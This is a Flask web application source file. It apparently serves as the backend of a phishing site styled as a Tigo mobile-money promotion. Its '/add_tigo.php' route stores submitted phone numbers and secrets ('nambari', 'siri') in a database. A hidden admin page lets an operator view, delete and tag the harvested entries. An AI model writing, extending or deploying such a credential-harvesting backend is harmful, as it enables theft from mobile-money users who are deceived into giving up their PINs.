from flask import Flask, request, render_template, redirect, url_for, session
import os
import uuid
import traceback
from supabase import create_client

app = Flask(__name__)
app.secret_key = os.environ.get("ADMIN_PASSWORD", "fallback-secret")

# Supabase
supabase = create_client(
    os.environ.get("SUPABASE_URL"),
    os.environ.get("SUPABASE_KEY")
)

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/success")
def success():
    return render_template("success.html")

@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link")

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return redirect("/success")

    except Exception as e:
        traceback.print_exc()
        return str(e), 500

# ---------------- ADMIN ----------------

@app.route("/adminvinc684833", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect(url_for("admin"))
        return "Wrong password", 403

    if not session.get("admin"):
        return render_template("admin_login.html")

    data = supabase.table("tigo_promotions").select("*").order("id", desc=True).execute().data
    return render_template("admin.html", rows=data)

@app.route("/admin/delete/<int:row_id>", methods=["POST"])
def delete_row(row_id):
    if not session.get("admin"):
        return "Unauthorized", 403

    supabase.table("tigo_promotions").delete().eq("id", row_id).execute()
    return redirect(url_for("admin"))

@app.route("/admin/generate-ref", methods=["POST"])
def generate_ref():
    if not session.get("admin"):
        return "Unauthorized", 403

    code = uuid.uuid4().hex[:10]
    return code
